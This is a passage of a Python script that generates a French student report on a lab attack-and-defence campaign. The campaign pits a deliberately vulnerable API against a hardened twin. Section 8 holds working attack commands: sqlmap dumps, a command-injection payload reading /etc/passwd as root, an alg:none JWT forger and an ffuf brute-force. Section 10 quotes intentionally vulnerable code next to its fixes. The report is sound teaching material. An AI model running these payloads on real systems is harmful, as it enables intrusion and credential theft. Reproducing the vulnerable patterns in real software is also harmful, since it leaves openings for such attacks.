    "Double faille révélée : l'injection SQL extrait le schéma, qui contient le commentaire "
    "source « -- VULN J3 : mot de passe stocké EN CLAIR ». La SQLi expose donc directement les "
    "mots de passe, eux-mêmes non hachés.", color=RED,
)
h3("Cible sécurisée → non injectable + rate-limit")
code_block(
    "sqlmap -u \"$SECURE/auth/login\" --method POST \\\n"
    "  --headers=\"Content-Type: application/json\" \\\n"
    "  --data='{\"username\":\"alice*\",\"password\":\"x\"}' \\\n"
    "  --dbms=sqlite --ignore-code=401 --technique=B --threads=1 \\\n"
    "  --flush-session --batch --level=5 --risk=3 --dump -T users"
)
code_block(
    "[CRITICAL] all tested parameters do not appear to be injectable.\n"
    "HTTP error codes detected during run:\n"
    "401 (Unauthorized) - 5 times, 429 (Too Many Requests) - 686 times"
)
para(
    "→ Requêtes paramétrées (injection impossible) ET rate-limiter (429 × 686). Deux contrôles "
    "indépendants se cumulent.", bold=True, color=GREEN,
)

# ---- 8.2 Command injection ----
h2("8.2 Injection de commandes / RCE (/tools/ping)")
para("Récupération d'un jeton (le mot de passe provient du dump sqlmap précédent) :")
code_block(
    "TOKEN_VULN=$(wget -qO- --header='Content-Type: application/json' \\\n"
    "  --post-data='{\"username\":\"alice\",\"password\":\"Sup3r-S3cret!Pass\"}' \\\n"
    "  \"$VULN/auth/login\" | grep -o '\"access_token\":\"[^\"]*\"' | cut -d'\"' -f4)"
)
h3("Cible vulnérable → exécution de code arbitraire en root")
code_block(
    "wget -qO- --header=\"Content-Type: application/json\" \\\n"
    "  --header=\"Authorization: Bearer $TOKEN_VULN\" \\\n"
    "  --post-data='{\"host\":\"127.0.0.1; id; hostname; cat /etc/passwd | head -3\"}' \\\n"
    "  \"$VULN/tools/ping\""
)
code_block(
    "PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.\n"
    "64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.118 ms\n"
    "...\n"
    "uid=0(root) gid=0(root) groups=0(root)        <- `id` execute\n"
    "9a12cec8517b                                   <- hostname du conteneur\n"
    "root:x:0:0:root:/root:/bin/bash                <- /etc/passwd lu\n"
    "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin"
)
para(
    "RCE confirmé, et le conteneur vuln tourne en uid=0(root) — double écart : faille applicative "
    "ET absence de durcissement, là où la stack durcie impose user 1000:1000, cap_drop ALL, "
    "rootfs en lecture seule et no-new-privileges.", color=RED,
)
h3("Cible sécurisée → 400 Bad Request, injection neutralisée")
code_block(
    "wget -S -qO- --header='Content-Type: application/json' \\\n"
    "  --header=\"Authorization: Bearer $TOKEN_SEC\" \\\n"
    "  --post-data='{\"host\":\"127.0.0.1; id\"}' \\\n"
    "  \"$SECURE/tools/ping\""
)
code_block(
    "HTTP/1.1 400 Bad Request\n"
    "x-content-type-options: nosniff\n"
    "x-frame-options: DENY\n"
    "referrer-policy: no-referrer\n"
    "cross-origin-opener-policy: same-origin\n"
    "cross-origin-resource-policy: same-origin\n"
    "content-security-policy: default-src 'none'; frame-ancestors 'none'\n"
    "permissions-policy: geolocation=(), microphone=(), camera=()\n"
    "strict-transport-security: max-age=63072000; includeSubDomains\n"
    "cache-control: no-store"
)
para(
    "→ L'hôte est validé puis exécuté sans shell (shell=False) : la requête renvoie 400, sans "
    "aucun uid=. Bonus : 8 en-têtes de sécurité absents de vuln_app.", bold=True, color=GREEN,
)

# ---- 8.3 JWT alg:none ----
h2("8.3 JWT alg:none (forge de jeton)")
para(
    "Le jeton de vuln_app a pour signature littérale « insecuresignature » : la signature n'est "
    "jamais vérifiée. On forge un jeton alg:none (signature vide) reprenant les claims :"
)
code_block(
    "FORGED_NONE=$(python3 - \"$TOKEN_VULN\" <<'EOF'\n"
    "import sys, base64, json\n"
    "h, p, s = sys.argv[1].split('.')\n"
    "b64d = lambda x: base64.urlsafe_b64decode(x + '='*(-len(x) % 4))\n"
    "b64e = lambda b: base64.urlsafe_b64encode(b).rstrip(b'=').decode()\n"
    "payload = json.loads(b64d(p))\n"
    "header = {\"alg\": \"none\", \"typ\": \"JWT\"}\n"
    "print(b64e(json.dumps(header, separators=(',',':')).encode()) + '.' +\n"
    "      b64e(json.dumps(payload, separators=(',',':')).encode()) + '.')\n"
    "EOF\n"
    ")"
)
h3("Cible vulnérable → 200, compte usurpé et mot de passe fuité")
code_block(
    "wget -S -qO- --header=\"Authorization: Bearer $FORGED_NONE\" \"$VULN/users/me\"\n"
    "\n"
    "HTTP/1.1 200 OK\n"
    "{\"id\":\"c31deeec-...\",\"username\":\"alice\",\"email\":\"a@x.com\","
    "\"password\":\"Sup3r-S3cret!Pass\"}"
)
h3("Cible sécurisée → 401 Unauthorized")
code_block(
    "wget -S -qO- --header=\"Authorization: Bearer $FORGED_NONE\" \"$SECURE/users/me\"\n"
    "\n"
    "HTTP/1.1 401 Unauthorized"
)
para(
    "→ La liste blanche d'algorithmes (HS256 uniquement) rejette le jeton à signature vide. "
    "L'usurpation échoue.", bold=True, color=GREEN,
)

# ---- 8.4 Brute-force ----
h2("8.4 Brute-force du login (ffuf)")
code_block(
    "printf '%s\\n' password 123456 admin letmein motdepasse 'Sup3r-S3cret!Pass' \\\n"
    "  azerty qwerty > /tmp/wl.txt\n"
    "\n"
    "# VULN : aucun rate-limit\n"
    "ffuf -w /tmp/wl.txt -u \"$VULN/auth/login\" -X POST \\\n"
    "  -H \"Content-Type: application/json\" \\\n"
    "  -d '{\"username\":\"alice\",\"password\":\"FUZZ\"}' -mc 200 -t 10\n"
    "\n"
    "# SECURE : rate-limiter\n"
    "ffuf -w /tmp/wl.txt -u \"$SECURE/auth/login\" -X POST \\\n"
    "  -H \"Content-Type: application/json\" \\\n"
    "  -d '{\"username\":\"alice\",\"password\":\"FUZZ\"}' -mc 200,429 -t 10"
)
code_block(
    "VULN   Sup3r-S3cret!Pass   [Status: 200]    <- mot de passe devine, aucune limite\n"
    "\n"
    "SECURE letmein             [Status: 429]\n"
    "       Sup3r-S3cret!Pass   [Status: 429]    <- meme le BON mdp est etrangle\n"
    "       azerty              [Status: 429]"
)
para(
    "→ Sur secure_app, même la combinaison valide ressort en 429 : le rate-limiter coupe la "
    "rafale avant tout aboutissement. Le brute-force est neutralisé.", bold=True, color=GREEN,
)

# ---- 8.5 Secrets clair ----
h2("8.5 Fuite de secrets en clair (transverse)")
para(
    "L'attaque transverse combine les failles précédentes : sur vuln_app, le mot de passe "
    "apparaît en clair dans le dump sqlmap, dans /users/me et dans le coffre, et la route "
    "/secrets/export livre tous les secrets sans authentification. Sur secure_app, les mots de "
    "passe sont hachés en Argon2id et les secrets chiffrés en AES-256-GCM : aucune de ces "
    "surfaces ne révèle de donnée exploitable."
)

# =====================================================================
# 9. SYNTHESE COMPARATIVE
# =====================================================================
h1("9. Synthèse comparative attaque / défense")
table = doc.add_table(rows=1, cols=5)
table.style = "Light Grid Accent 1"
table.alignment = WD_TABLE_ALIGNMENT.CENTER
hdr = table.rows[0].cells
for i, txt in enumerate(["Attaque", "Outil", "vuln_app (8002)", "secure_app (8001)",
                         "Contrôle défensif"]):
    rr = hdr[i].paragraphs[0].add_run(txt)
    rr.bold = True
    rr.font.size = Pt(10)
    _set_run_font(rr)
rows = [
    ("Injection SQL", "sqlmap", "table users dumpée", "non injectable + 429",
     "Requêtes paramétrées"),
    ("Command injection", "payload /tools/ping", "200 → uid=0(root)", "400 host rejeté",
     "subprocess shell=False + validation"),
    ("JWT alg:none", "python / jwt_tool", "200 compte usurpé", "401 rejeté",
     "Liste blanche HS256"),
    ("Brute-force", "ffuf", "200 mot de passe trouvé", "429 étranglé",
     "Rate-limiter fenêtre glissante"),
    ("Secrets en clair", "transverse", "mot de passe lisible ×3", "Argon2id + AES-256-GCM",
     "Hachage + chiffrement au repos"),
]
for r in rows:
    cells = table.add_row().cells
    for i, val in enumerate(r):
        rr = cells[i].paragraphs[0].add_run(val)
        rr.font.size = Pt(9)
        _set_run_font(rr)
doc.add_paragraph()
para(
    "Couches d'écart supplémentaires côté secure_app : 8 en-têtes de sécurité HTTP, conteneur "
    "non-root (1000:1000), cap_drop ALL, rootfs en lecture seule, no-new-privileges, et secret "
    "fail-closed (refus de démarrer sans clé ≥ 32 caractères).", italic=True, color=GREY,
)
para(
    "Visualisation temps réel : dashboard Grafana « Comparatif secure_app vs vuln_app » alimenté "
    "par la télémétrie middleware (table app_requests).", italic=True, color=GREY,
)

# =====================================================================
# 10. DETAIL DES CORRECTIFS DEFENSIFS
# =====================================================================
h1("10. Détail des correctifs défensifs (vulnérable → durci)")
para(
    "Cette section met face à face, pour chaque famille d'attaque réussie sur vuln_app, le code "
    "fautif et le correctif appliqué dans secure_app. C'est le cœur de la démonstration "
    "défensive : montrer non seulement que l'attaque échoue, mais POURQUOI."
)

h2("10.1 Correctif injection SQL — requêtes paramétrées")
para("Vulnérable (concaténation) :")
code_block(
    "q = f\"SELECT * FROM users WHERE username = '{username}' \"\\\n"
    "    f\"AND password = '{password}'\"\n"
    "conn.execute(q)        # alice'--  ->  authentification contournée"
)
para("Durci (paramètres liés + mot de passe haché) :")
code_block(
    "row = conn.execute(\n"
    "    \"SELECT id, username, password_hash FROM users WHERE username = ?\",\n"
    "    (username,),\n"
    ").fetchone()\n"
    "ok = row and security.verify_password(row['password_hash'], password)"
)
para(
    "Le driver SQLite ne substitue jamais le paramètre dans le texte SQL : il le transmet "
    "séparément au moteur. La chaîne de l'attaquant ne peut donc plus modifier la structure de la "
    "requête.",
)

h2("10.2 Correctif injection de commandes — shell=False + validation")
para("Vulnérable (shell=True sur f-string) :")
code_block(
    "cmd = f\"ping -c 1 {data.host}\"\n"
    "subprocess.run(cmd, shell=True)     # host='x; id'  ->  RCE"
)
para("Durci (validation stricte puis liste d'arguments sans shell) :")
code_block(
    "if not _is_valid_target(host):       # IP valide OU hostname whitelisté\n"
    "    raise HTTPException(400, \"Hôte invalide.\")\n"
    "ping_bin = shutil.which(\"ping\")      # binaire résolu en chemin absolu\n"
    "args = [ping_bin, \"-c\", \"2\", host]   # LISTE d'arguments\n"
    "subprocess.run(args, shell=False, timeout=5)   # le shell n'interprète rien"
)
para(
    "Deux barrières indépendantes : (1) l'entrée est rejetée avant toute exécution si elle n'est "
    "pas une cible légitime ; (2) même si elle passait, l'absence de shell empêche "
    "l'interprétation des métacaractères (;, |, &&, $()).",
)

h2("10.3 Correctif JWT — liste blanche d'algorithmes")
para("Vulnérable (signature ignorée / alg:none accepté) :")
code_block(
    "jwt.decode(token, options={\"verify_signature\": False})   # signature ignorée\n"
    "# ou bien : algorithms=[\"HS256\", \"none\"]                   # alg confusion"
)
para("Durci (un seul algorithme, claims obligatoires, révocation) :")
code_block(
    "jwt.decode(token, secret_key,\n"
    "           algorithms=[\"HS256\"],                  # whitelist stricte\n"
    "           options={\"verify_signature\": True,\n"
    "                    \"verify_exp\": True,\n"
    "                    \"require\": [\"exp\",\"sub\",\"jti\",\"type\"]})"
)

h2("10.4 Correctif mots de passe — Argon2id")
para("Vulnérable (clair) vs durci (Argon2id, salt intégré) :")
code_block(
    "# Vulnérable : stockage et comparaison en clair\n"
    "INSERT INTO users(..., password) VALUES (..., 'Sup3r-S3cret!Pass')\n"
    "\n"
    "# Durci : hash Argon2id (memory-hard), vérification temps quasi-constant\n"
    "password_hash = PasswordHasher(time_cost=3, memory_cost=65536,\n"
    "                               parallelism=4).hash(password)"
)

h2("10.5 Correctif secrets — chiffrement au repos AES-256-GCM")
para(
    "Vulnérable : la valeur est stockée en clair et une route /secrets/export la dumpe sans "
    "authentification. Durci : la valeur est chiffrée par AESGCM (clé dérivée HKDF-SHA256) avant "
    "écriture ; la liste ne montre qu'un aperçu masqué et le clair n'est rendu qu'au propriétaire "
    "authentifié (cf. §6.1). Un dump de base ne livre que du ciphertext.",
)

h2("10.6 Correctif BOLA — filtrage par propriétaire")
para(
    "Vulnérable : SELECT ... WHERE id = ? (sans owner). Durci : SELECT ... WHERE id = ? AND "
    "owner_id = ?, renvoyant 404 si la ressource appartient à autrui — l'IDOR ne peut plus "
    "traverser la frontière entre utilisateurs.",
)

h2("10.7 Correctif brute-force — rate limiting")
para(
    "Vulnérable : aucune limite, tentatives illimitées. Durci : limiteur à fenêtre glissante "
    "(quota configurable, défaut 5 tentatives / 60 s par IP) renvoyant 429 au-delà du seuil — "
    "y compris pour une combinaison valide, ce qui casse toute rafale automatisée.",
)

# =====================================================================
# 11. DEVSECOPS / CI
# =====================================================================
h1("11. Chaîne DevSecOps et intégration continue (CI/CD)")
para(
    "Un pipeline GitHub Actions s'exécute à chaque push sur la branche principale et à chaque "
    "pull request. Il garantit la qualité et la sécurité du code avant toute mise en production, "
    "et rejoue automatiquement le scénario attaque/défense."
)
h2("11.1 Étapes du pipeline")
bullets([
    ("Ruff : ", "lint et tri des imports."),
    ("Bandit : ", "analyse statique de sécurité (SAST) du code Python."),
    ("Semgrep (p/python) : ", "règles de sécurité additionnelles (SAST)."),
    ("Validation des schémas JSON : ", "contrôle des fixtures d'événements (B9)."),
    ("Matrice de confusion du classifieur : ", "évaluation du classifieur de l'analyzer (B14)."),
    ("Pytest : ", "suite de 66 tests unitaires et d'intégration."),
    ("secure-app-live : ", "smoke-test « boîte noire » — l'image est construite, lancée, puis le "
     "scénario attaque/défense (19 contrôles) est rejoué contre le conteneur réel."),
    ("j2-memory-safety : ", "preuve déterministe en CI du canari de pile (abort SIGABRT) et de la "
     "version bornée durcie (refus propre) contre un buffer-overflow."),
    ("OWASP ZAP (DAST) : ", "scan dynamique du conteneur en marche ; le rapport HTML/Markdown est "
     "publié en artefact."),
    ("Trivy : ", "scan des 5 images Docker du projet (échec si CVE CRITICAL non corrigée)."),
])
h2("11.2 Gestion des secrets de production (fail-closed)")
para(
    "Le secret applicatif n'est jamais embarqué dans l'image ni dans le dépôt. En production, son "
    "absence empêche le démarrage (RuntimeError). Lors du déploiement, une clé forte est générée "
    "et injectée par variable d'environnement :"
)
code_block(
    "SECRET=$(python3 -c \"import secrets; print(secrets.token_urlsafe(48))\")\n"
    "docker run -d --name secure_app -p 8001:8000 \\\n"
    "  -e SECURE_APP_ENV=prod \\\n"
    "  -e SECURE_APP_SECRET_KEY=\"$SECRET\" \\\n"
    "  secure_app/api:ci"
)
h2("11.3 Sécurité mémoire — preuve du lab buffer-overflow (J2)")
para(
    "secure_app étant écrit en Python (langage à mémoire gérée, donc à l'abri des dépassements de "
    "tampon classiques), la classe de vulnérabilité « buffer overflow » est illustrée sur un lab "
    "C dédié, et prouvée de façon déterministe en CI. Trois variantes du même programme "
    "d'authentification sont compilées :"
)
bullets([
    ("vuln_nomit : ", "version naïve, sans protection — l'overflow peut écraser un drapeau "
     "d'authentification sur la pile."),
    ("vuln_canary : ", "même code mais compilé avec canari de pile — l'overflow est détecté et le "
     "programme s'interrompt (abort)."),
    ("hardened : ", "version bornée et durcie — la copie est limitée, l'accès est proprement "
     "refusé sans aucune corruption."),
])
para("La CI fige deux preuves dures et déterministes :")
code_block(
    "# (3) Overflow AVEC canari -> abort attendu (SIGABRT, rc 134 = 128 + 6)\n"
    "PAYLOAD=$(python3 -c 'print(\"A\"*64)')\n"
    "./vuln_canary \"$PAYLOAD\"; rc=$?\n"
    "test \"$rc\" -eq 134        # le canari transforme l'overflow en arret net\n"
    "\n"
    "# (4) Même overflow sur la version bornée+durcie -> aucun crash (rc 1)\n"
    "./hardened \"$PAYLOAD\"; rc=$?\n"
    "test \"$rc\" -eq 1          # acces refuse proprement, pas de corruption"
)
para(
    "Enseignement : le canari de pile (défense de l'environnement de compilation) et la copie "
    "bornée (défense du code) sont complémentaires — l'un détecte la corruption, l'autre "
    "l'empêche.", italic=True, color=GREY,
)

# =====================================================================
# 12. CORRECTIONS CI
# =====================================================================
h1("12. Corrections apportées au pipeline d'intégration")
para(
    "L'ajout du coffre à secrets et de la refonte graphique a déclenché plusieurs échecs "
    "successifs du pipeline. Principe directeur respecté tout du long : ne jamais contourner un "
    "contrôle de sécurité pour faire passer la CI, mais corriger la cause racine.",
    bold=True, color=GREEN,
)
h2("12.1 Lint (Ruff) — tri d'imports et mot de passe de démonstration")
para(
    "Deux signalements : I001 (ordre des imports de la bibliothèque cryptography) et S105 (chaîne "
    "ressemblant à un mot de passe en dur dans seed.py). Le premier a été corrigé par réordonnance "
    "alphabétique des imports ; le second, qui concerne un mot de passe de démonstration assumé, a "
    "été explicitement justifié."
)
code_block(
    "# crypto.py — imports réordonnés (corrige I001)\n"
    "from cryptography.hazmat.primitives.ciphers.aead import AESGCM\n"
    "from cryptography.hazmat.primitives.hashes import SHA256\n"
    "from cryptography.hazmat.primitives.kdf.hkdf import HKDF\n"
    "\n"
    "# seed.py — mot de passe de démo assumé (corrige S105)\n"
    "DEMO_PASSWORD = \"Sup3r-S3cret!Pass\"  # noqa: S105 (démo, pas un secret de prod)"
)
h2("12.2 SAST (Semgrep) — faux positif de fuite de log")
para(
    "La règle logger-credential-leak signalait la journalisation supposée d'une donnée sensible "
    "dans le routeur des secrets. En réalité, seul l'identifiant (UUID) du secret est journalisé, "
    "jamais la valeur déchiffrée. Le message a été reformulé pour lever l'ambiguïté et le faux "
    "positif neutralisé par une annotation ciblée."
)
code_block(
    "except Exception:\n"
    "    # On ne journalise QUE l'identifiant (UUID), jamais la valeur déchiffrée.\n"
    "    # nosemgrep\n"
    "    logger.exception(\"Déchiffrement impossible pour l'id %s\", secret_id)"
)
h2("12.3 Tests (Pytest) — conflit entre le seed et les comptes de test")
para(
    "Le seed de démonstration pré-créait alice et bob ; or les tests créent eux-mêmes ces comptes "
    "et attendaient un code 201, mais recevaient 409 (conflit). Cause racine : l'état initial de "
    "la base différait entre exécution normale et exécution de test. Correctif : un drapeau de "
    "configuration SECURE_APP_SEED_DEMO permet de désactiver le seed, mis à 0 dans la "
    "configuration de test."
)
code_block(
    "# config.py — drapeau de seed (activé par défaut, désactivable)\n"
    "seed_demo: bool = field(default_factory=lambda:\n"
    "    os.environ.get(\"SECURE_APP_SEED_DEMO\", \"1\").lower()\n"
    "    not in {\"0\", \"false\", \"no\"})\n"
    "\n"
    "# main.py — le seed n'est appliqué que si le drapeau est actif\n"
    "if settings.seed_demo:\n"
    "    seed.seed_if_empty(conn)\n"
    "\n"
    "# tests/secure_app/conftest.py — désactivation en test\n"
    "os.environ.setdefault(\"SECURE_APP_SEED_DEMO\", \"0\")"
)
h2("12.4 Smoke-test « boîte noire » (secure-app-live)")
para(
    "Pour la même raison, le scénario attaque/défense rejoué en CI échouait à l'étape register "
    "(alice/bob déjà créés par le seed → 409). Correctif : désactiver le seed dans le job live, "
    "afin que le scénario crée lui-même ses comptes."
)
code_block(
    "# .github/workflows/ci.yml — job secure-app-live\n"
    "docker run -d --name secure_app -p 8001:8000 \\\n"
    "  -e SECURE_APP_ENV=prod \\\n"
    "  -e SECURE_APP_SECRET_KEY=\"$SECRET\" \\\n"
    "  -e SECURE_APP_SEED_DEMO=0 \\\n"
    "  secure_app/api:ci"
)
para(
    "Bilan : les quatre échecs ont été résolus par correction de la cause racine (tri d'imports, "
    "annotation d'un faux positif documenté, drapeau de configuration neutralisant un conflit "
    "d'état de test) — jamais par affaiblissement d'un contrôle de sécurité.",
    bold=True, color=GREEN,
)

# =====================================================================
# 13. TESTS
# =====================================================================
h1("13. Tests et validation")
bullets([
    ("Tests automatisés : ", "66 tests passent (validation d'entrée, injections, anti-BOLA, "
     "rate limiting, authentification, MFA, coffre à secrets, schémas JSON)."),
    ("Vérification fonctionnelle du coffre : ", "côté secure, liste masquée, révélation au "
     "propriétaire, et BOLA renvoyant 404 confirmés ; côté vuln, valeurs en clair et dump complet "
     "via /secrets/export confirmés."),
    ("Validation en conteneur : ", "les deux images ont été reconstruites, lancées et testées de "
     "bout en bout (pages, authentification, coffre) localement puis sur le droplet."),
    ("Validation offensive : ", "5 familles d'attaques rejouées en production depuis Kali — "
     "5/5 réussies côté vuln_app, 5/5 bloquées côté secure_app."),
    ("Preuve mémoire (J2) : ", "en CI, le canari de pile transforme l'overflow en abort "
     "(rc 134 = 128 + SIGABRT) et la version bornée durcie refuse proprement (rc 1)."),
])

# =====================================================================
# 14. CONCLUSION
# =====================================================================
h1("14. Conclusion et perspectives")
para(
    "Le binôme a livré un système complet illustrant, de façon mesurable et reproductible, "
    "l'impact des bonnes pratiques de sécurité applicative. Les deux applications jumelles "
    "rendent tangible chaque notion du programme : une même attaque échoue d'un côté et réussit "
    "de l'autre, la seule variable étant la qualité défensive du code et de son environnement "
    "d'exécution. La campagne offensive menée depuis Kali matérialise cet écart sur cinq familles "
    "d'attaques, et la chaîne DevSecOps garantit la non-régression de ces propriétés."
)
para("Points forts du livrable :")
bullets([
    "Défense en profondeur effective et démontrée de J1 à J5.",
    "Chiffrement au repos (AES-256-GCM) et contrôle d'accès par propriétaire sur les données "
    "sensibles.",
    "Chaîne DevSecOps automatisée (SAST, DAST, scan d'images, tests, smoke-test boîte noire).",
    "Observabilité comparative en temps réel via Grafana.",
])
para("Perspectives d'amélioration :")
bullets([
    "Externaliser le rate limiting et la liste de révocation vers Redis (cohérence "
    "multi-instances).",
    "Ajouter une rotation de clés et un coffre dédié (type Vault) pour la gestion des secrets.",
    "Étendre la couverture DAST (scan authentifié, règles actives complètes).",
    "Compléter la MFA par des codes de récupération et la détection d'anomalies de connexion.",
])

# =====================================================================
# 15. ANNEXES
# =====================================================================
h1("15. Annexes")
h2("15.1 Cadre légal et éthique")
para(
    "Toutes les attaques ont été menées exclusivement contre l'infrastructure du binôme (droplet "
    "personnel), avec consentement explicite, sans charge destructrice. La cible vuln_app, "
    "volontairement trouée et exposée sur Internet, est éteinte et son port refermé dès la fin "
    "des captures. Ce document, qui décrit des techniques offensives, est à diffusion restreinte "
    "et à finalité pédagogique."
)
h2("15.2 Environnement technique")
bullets([
    ("Langage / framework : ", "Python 3.12, FastAPI, Pydantic, PyJWT, argon2-cffi, cryptography, "
     "pyotp."),
    ("Données : ", "SQLite (applications jumelles), PostgreSQL (analyzer / télémétrie)."),
    ("Conteneurisation : ", "Docker, Docker Compose."),
    ("Offensif : ", "Kali Linux — sqlmap, ffuf, commix, wget, python3."),
    ("CI/CD : ", "GitHub Actions — Ruff, Bandit, Semgrep, Trivy, OWASP ZAP, Pytest."),
    ("Hébergement : ", "droplet DigitalOcean (64.226.106.122)."),
])
h2("15.3 Commande de démontage post-démonstration")
code_block(
    "ssh root@64.226.106.122 \\\n"
    "  'cd ~/honeypot-m1spro/vuln_app && docker compose down -v && "
    "ufw delete allow 8002/tcp'"
)
h2("15.4 Glossaire")
bullets([
    ("AEAD : ", "Authenticated Encryption with Associated Data — chiffrement garantissant à la "
     "fois confidentialité et intégrité (ex. AES-256-GCM)."),
    ("Argon2id : ", "fonction de hachage de mots de passe mémoire-hard, lauréate de la Password "
     "Hashing Competition (2015)."),
    ("BOLA / IDOR : ", "Broken Object Level Authorization — accès à l'objet d'autrui via la "
     "manipulation de son identifiant."),
    ("CSP : ", "Content-Security-Policy — en-tête limitant les sources de scripts/styles pour "
     "contrer le XSS."),
    ("DAST : ", "Dynamic Application Security Testing — test dynamique d'une application en "
     "fonctionnement (ex. OWASP ZAP)."),
    ("HKDF : ", "HMAC-based Key Derivation Function — dérive des sous-clés indépendantes depuis "
     "une clé maître."),
    ("JWT : ", "JSON Web Token — jeton signé porteur de claims d'authentification."),
    ("MFA / TOTP : ", "authentification multifacteur ; TOTP = code à usage unique basé sur le "
     "temps (RFC 6238)."),
    ("RCE : ", "Remote Code Execution — exécution de code arbitraire à distance."),
    ("SAST : ", "Static Application Security Testing — analyse statique du code source (ex. "
     "Bandit, Semgrep)."),
    ("SQLi : ", "SQL Injection — détournement d'une requête SQL via une entrée non assainie."),
])

# Pied auteurs
doc.add_paragraph()
p = doc.add_paragraph()
p.alignment = WD_ALIGN_PARAGRAPH.CENTER
r = p.add_run("— Rapport rédigé par ANANI Georges Lionel et BOHOUSSOU Kouamé Marc —")
r.italic = True
r.font.color.rgb = GREY
_set_run_font(r)

# --- Pied de page avec numérotation « Page X » (Times New Roman) ----------
footer = doc.sections[0].footer
fp = footer.paragraphs[0]
fp.alignment = WD_ALIGN_PARAGRAPH.CENTER
run_lbl = fp.add_run("Page ")
_set_run_font(run_lbl)
run_lbl.font.size = Pt(9)
run_lbl.font.color.rgb = GREY
# champ PAGE (numéro de page automatique)
fld_begin = OxmlElement("w:fldChar"); fld_begin.set(qn("w:fldCharType"), "begin")
instr = OxmlElement("w:instrText"); instr.set(qn("xml:space"), "preserve"); instr.text = "PAGE"
fld_end = OxmlElement("w:fldChar"); fld_end.set(qn("w:fldCharType"), "end")
run_field = fp.add_run()
run_field._r.append(fld_begin)
run_field._r.append(instr)
run_field._r.append(fld_end)
_set_run_font(run_field)
run_field.font.size = Pt(9)
run_field.font.color.rgb = GREY

out = r"Rapport des Tests/Rapport_Complet_M1SPRO_ANANI_BOHOUSSOU.docx"
doc.save(out)
print("OK ->", out)
